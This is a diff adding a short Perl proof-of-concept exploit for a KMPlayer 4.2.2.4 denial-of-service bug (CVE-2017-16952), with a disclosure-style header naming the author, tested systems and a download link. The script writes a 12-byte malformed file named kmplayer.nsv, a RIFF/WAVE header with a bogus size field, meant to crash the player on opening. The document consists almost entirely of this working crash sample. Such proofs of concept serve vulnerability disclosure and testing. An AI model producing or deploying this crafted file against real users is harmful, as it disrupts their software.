@@ -1,0 +1,20 @@
+#! /usr/bin/perl
+# Exploit Title: KMPlayer .nsv Denial of Service
+# Date: 2017-11-22
+# Exploit Author: R.Yavari
+# Version: v4.2.2.4 
+# Tested on: Windows 10 , Windows 7
+# other version should be affected
+# NSV is Streaming video container format developed by Nullsoft; used for streaming video clips over the Internet,
+# such as video feeds for Winamp TV; supports multiple types of compression and can include multiple audio tracks, subtitles, and other data.
+# CVE-2017-16952
+# http://cdn.kmplayer.com/KMP/Download/release/chrome/4.2.2.4/KMPlayer_4.2.2.4.exe
+# (D.P)
+
+open(code, ">kmplayer.nsv") || die "can't create crash sample.$!";
+binmode(code);
+$data = 
+"\x52\x49\x46\x46\xc2\x58\x01\x00\x57\x41\x56\x45";
+print code $data;
+ 
+close(code);
